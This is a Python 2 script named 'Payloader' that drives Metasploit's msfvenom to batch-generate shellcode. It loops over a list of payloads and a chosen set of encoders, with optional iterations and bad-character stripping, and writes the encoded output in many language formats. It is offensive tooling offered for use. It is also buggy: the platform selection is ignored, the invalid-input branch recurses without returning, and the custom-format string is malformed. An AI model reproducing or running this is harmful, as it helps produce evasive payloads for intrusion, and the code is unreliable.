#!/usr/bin/python

import os
import sys
import distutils.spawn
import shutil

def banner():
	print 	"""
###########__Payloader__###########
*Author  : 4bh1			 *
*Version : 0.3b			 *
*Date    : 27/Feb/2016           *
*Greetz  : Un_Non,pr4sh,sidl0ve, *
	   pr4tham,Maya,inject0r,*
	   Fattal Cuddle         *
###########__Payloader__###########
""" 

def payload():
#payload list
	f = open("pay",'r')
	return f.read().split('\n')[:-1]

def encoder():
#encoders initializations

	#Encoder dictonary 
	d = {1: "Encoder_list/cmd_enc",2: 'Encoder_list/generic_enc',3: 'Encoder_list/mipsbe_enc',4: 'Encoder_list/php_enc',5: 'Encoder_list/ppc_enc',6: 'Encoder_list/sparc_enc',7: r'Encoder_list/x64_enc',8: r'Encoder_list/x86_enc'}
	print "Select type of encoders:"
	print """	1.cmd
	2.generic
	3.mipsbe4
	4.php
	5.ppc
	6.sparc
	7.x64
	8.x86"""
	
	#check int inputs and the range of the inputs
	try :
		a = int(raw_input("Enter selection = "))
	except Exception:
		print "[-] Incorrect Input [-]"
		sys.exit(0)
	if a not in range(1,9):
		if raw_input("Invalid Range. Select default value?[y/n]:") in ['y','Y']:
			return open(d[8],'r').read().split()
		else :
			encoder()
	else :
		return open(d[int(a)],'r').read().split()			
	

def output_format():
#output format
	#checking for existing directory for storing shellcodes
	if os.path.exists(os.getcwd()+'/output/') is True :
		print 'The outupt directory for shellcodes already exist'
		if raw_input('Remove previous directory ?[y/n]') in ['y','Y']:
			shutil.rmtree(os.getcwd()+'/output/')
			print 'Recreating Directory'
		else :
			print 'Please take backup of your previous shellcodes'
			print 'Exiting'
			sys.exit(0)
	#creating directory for storing the shellcode	
	os.mkdir('output')
	os.chdir('output')
	op = ' -f python -o ' + os.getcwd() + '/'
	#selecting output format 
	if raw_input("Do you want custom output for your shellcode (Default:python) [y/N] :") in ['y','Y'] :
		print "Output formats:"
		print "bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript"
		forma = raw_input("Enter your choice : ")
		if forma in ['bash', 'c', 'csharp', 'dw', 'dword', 'hex', 'java', 'js_be', 'js_le', 'num', 'perl', 'pl', 'powershell', 'ps1', 'py', 'python', 'raw', 'rb', 'ruby', 'sh', 'vbapplication', 'vbscript'] : 
			print "[+] Selected {} format [+]".format(forma)
			op = ' -f {} -o '.format(forma) +  + os.getcwd()
			return op
		else :
			print "[-] Incorrect format selection proceding with python [-]"
			return op
	else :
		return op		
		
def bad_ch():
#bad character
	sys.stdout.write("Do you want to include bad characters "+r'\x00\xff' + "[y/N]:")
	if raw_input() in ['y','Y']:
		bad_char =r' -b "\x00\xff"'
		return bad_char
	else :
		bad_char = ''
		return bad_char 

def platform_sel():
#platform selection 
	plat = ' windows'
	if raw_input("Select the platform (Default:windows) [y/N] :") in ['y','Y'] :
		print "Platforms :"
		print "hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe, freebsd, aix, osx, bsd, openbsd, bsdi, netbsd, netware, android, java, ruby, linux, cisco, solaris, windows"
		p_in = raw_input("Enter your choice : ")
		if p_in in ['hpux', 'irix', 'unix', 'php', 'javascript', 'python', 'nodejs', 'firefox', 'mainframe', 'freebsd', 'aix', 'osx', 'bsd', 'openbsd', 'bsdi', 'netbsd', 'netware', 'android', 'java', 'ruby', 'linux', 'cisco', 'solaris', 'windows'] : 
			print "[+] Selected {} platform [+]".format(p_in)
			return p_in
		else :
			print "[-] Incorrect platform selection proceding with windows [-]"
			return plat
	else :
		return plat

def iteration():
#setting up iterations 
	if raw_input("Do you want to add iteration for the encoder?[y/N]") in ['y','Y']:
		return ' -i ' + raw_input('Enter the number of iterations')
	else :
		return "" 
		
def now_make(pay,enco,ite,bad_char):
#creating shellcodes
	print "Generating shellcodes please standby"
	for x in range(len(pay)):
		for y in range(len(enco)):
			os.system("msfvenom -a x86 --platform windows"+" -p " + pay[x] + ' -e' + enco[y] + ite + bad_char + op + str(x) + str(y) + ".py")

#initalizing the main data 	
if __name__=='__main__':
	if distutils.spawn.find_executable('msfvenom') is not None:
		pass
	else :
		print 'Check if Metasploit is installed.'
		sys.exit(0)
	banner()
	pla = platform_sel()
	print "[+]platform done"
	pay = payload()
	print "[+]payload done"
	enco = encoder()
	print "[+]encoder done"
	ite = iteration()
	print "[+]Iteration Done"
	bad_char = bad_ch()
	print "[+]bad character done"
	op = output_format()
	print "[+]output done"
	now_make(pay,enco,ite,bad_char)
	print "[+]Done[+]"
